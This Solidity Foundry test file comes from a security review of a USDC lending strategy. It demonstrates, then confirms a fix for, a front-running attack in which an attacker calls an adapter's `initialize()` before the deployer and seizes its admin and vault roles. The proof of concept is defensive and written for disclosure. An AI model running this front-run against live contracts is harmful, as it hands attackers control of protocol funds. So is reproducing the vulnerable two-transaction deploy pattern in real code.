// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * FINDING (FIXED at the deploy-script level): The front-runnable
 *          `initialize()` pattern shown against StrategyBootstrapper in
 *          BootstrapperFrontRun_AdapterHijack.t.sol was not an isolated
 *          case -- the shipped deploy script used the same
 *          `new X(); x.initialize(...)` two-transaction pattern for EVERY
 *          one of the 7 lending adapters. Each adapter's `initialize()`
 *          grants `admin_` DEFAULT_ADMIN_ROLE + PARAM_ROLE and records
 *          `vault_` for the `onlyVault` gate (e.g.
 *          CometUsdcMultiMarket.sol:173-196) -- whoever's `initialize()`
 *          call is mined first wins.
 *
 * SEVERITY: HIGH-CRITICAL at deployment time (was).
 *
 * FIX: `script/DeployUsdcLendingStrategy.s.sol` now deploys all 7 adapters
 * (and the bootstrapper) via `AdapterFactory.deployAndInit()`, which bundles
 * CREATE2-deploy and `initialize()` into a single atomic transaction. The
 * adapter contracts themselves are unchanged (this is inherent to the
 * non-proxy Initializable pattern) -- safety comes entirely from always
 * deploying atomically via the factory, never via a raw `new X()` followed
 * by a separate `initialize()` call.
 *
 * Test 1 (kept from the original PoC) still reproduces the front-run against
 * the RAW pattern, to document why it must never be used. Test 2 proves the
 * actual fix: the same attack attempted against the factory-based flow fails.
 */

import { Test, console2 } from "forge-std/Test.sol";
import {
    CometUsdcMultiMarketAdapter
} from "../../../../src/strategies/usdc-lending/adapters/lending/CometUsdcMultiMarket.sol";
import { AdapterFactory } from "../../../../src/strategies/usdc-lending/factory/AdapterFactory.sol";
import { SimpleProtocolRegistry } from "../../../helpers/SimpleProtocolRegistry.sol";
import { MockUSDCComet, MockComet } from "../adapters/CometUsdcMultiMarketAdapter.t.sol";

contract AdapterInitializeFrontRun_Comet_PoC is Test {
    address deployer = address(0xD00D);   // the legitimate operator running the deploy script
    address attacker = address(0xBAD);    // holds no role anywhere, front-runs the mempool
    address realStrategy = address(0x51A7E617);

    function test_POC_1_raw_new_then_initialize_pattern_is_still_frontrunnable() public {
        MockUSDCComet usdc = new MockUSDCComet();
        MockComet comet1 = new MockComet(address(usdc));

        SimpleProtocolRegistry registry = new SimpleProtocolRegistry();
        registry.addVault(
            SimpleProtocolRegistry.ProtocolType.COMPOUND_V3,
            address(comet1),
            "MockComet1",
            10000,
            100_000_000e6
        );

        // --- Phase 1.5 of DeployUsdcLendingStrategy.s.sol, tx 1 of 2 ---
        vm.prank(deployer);
        CometUsdcMultiMarketAdapter cmt = new CometUsdcMultiMarketAdapter();

        // *** THE WINDOW ***
        // On a real chain, "cmt.initialize(chainCfg.usdc, cfg.deployer,
        // address(result.strategy), CAP, registry);" is now sitting in the
        // mempool as tx 2 of 2. Nothing about the already-deployed `cmt`
        // contract restricts who can call initialize() first.
        MockComet attackerComet = new MockComet(address(usdc));
        SimpleProtocolRegistry attackerRegistry = new SimpleProtocolRegistry();
        attackerRegistry.addVault(
            SimpleProtocolRegistry.ProtocolType.COMPOUND_V3,
            address(attackerComet),
            "AttackerComet",
            10000,
            1e6
        );

        vm.prank(attacker);
        cmt.initialize(address(usdc), attacker, attacker, 0, address(attackerRegistry));

        assertTrue(cmt.hasRole(cmt.DEFAULT_ADMIN_ROLE(), attacker), "VULNERABLE: attacker holds DEFAULT_ADMIN_ROLE on the real adapter contract address");
        assertTrue(cmt.hasRole(cmt.PARAM_ROLE(), attacker), "VULNERABLE: attacker holds PARAM_ROLE too");
        assertEq(cmt.vault(), attacker, "VULNERABLE: onlyVault now points at the attacker, not the real strategy");

        // The legitimate deploy script's own initialize() call for this exact
        // adapter now reverts -- deployment of this market is permanently
        // bricked (initializer is one-shot; there is no retry path).
        vm.prank(deployer);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        cmt.initialize(address(usdc), deployer, realStrategy, 10_000_000e6, address(registry));
    }

    /// @notice Test 2: the FIXED deploy-script pattern for adapters --
    ///         AdapterFactory.deployAndInit(), exactly as
    ///         script/DeployUsdcLendingStrategy.s.sol's Phase 1.5 now does
    ///         for all 7 adapters.
    function test_POC_2_AdapterFactory_deployAndInit_is_not_frontrunnable() public {
        MockUSDCComet usdc = new MockUSDCComet();
        MockComet comet1 = new MockComet(address(usdc));
        SimpleProtocolRegistry registry = new SimpleProtocolRegistry();
        registry.addVault(
            SimpleProtocolRegistry.ProtocolType.COMPOUND_V3,
            address(comet1), "MockComet1", 10000, 100_000_000e6
        );

        vm.startPrank(deployer);
        AdapterFactory factory = new AdapterFactory(deployer);

        bytes32 salt = keccak256("comet-salt");
        address predicted = factory.computeAddress(type(CometUsdcMultiMarketAdapter).creationCode, salt);
        assertEq(predicted.code.length, 0, "sanity: no attacker target exists before the atomic deploy");

        address cmt = factory.deployAndInit(
            type(CometUsdcMultiMarketAdapter).creationCode,
            salt,
            abi.encodeCall(
                CometUsdcMultiMarketAdapter.initialize,
                (address(usdc), deployer, realStrategy, 10_000_000e6, address(registry))
            )
        );
        vm.stopPrank();

        assertEq(cmt, predicted, "address prediction still matches (CREATE2-deterministic)");
        CometUsdcMultiMarketAdapter deployed = CometUsdcMultiMarketAdapter(payable(cmt));
        assertTrue(deployed.hasRole(deployed.DEFAULT_ADMIN_ROLE(), deployer), "FIXED: legitimate deployer holds admin");
        assertEq(deployed.vault(), realStrategy, "FIXED: onlyVault correctly points at the real strategy");

        // The same front-run attempt now finds an already-initialized
        // contract -- nothing to hijack.
        vm.prank(attacker);
        vm.expectRevert(bytes("Initializable: contract is already initialized"));
        deployed.initialize(address(usdc), attacker, attacker, 0, address(0));

        assertFalse(deployed.hasRole(deployed.DEFAULT_ADMIN_ROLE(), attacker));
    }
}
